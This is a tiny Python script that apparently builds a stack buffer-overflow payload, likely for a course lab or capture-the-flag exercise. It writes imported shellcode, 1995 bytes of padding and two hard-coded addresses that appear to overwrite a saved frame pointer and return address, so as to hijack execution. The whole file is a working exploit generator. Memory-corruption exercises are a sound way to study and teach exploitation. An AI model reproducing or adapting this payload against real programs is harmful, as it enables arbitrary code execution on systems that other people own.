from shellcode import shellcode
import sys


sys.stdout.buffer.write(shellcode + b"\x32" *1995 + b"\x08\xf4\xf6\xff" + b"\x1c\xfc\xf6\xff")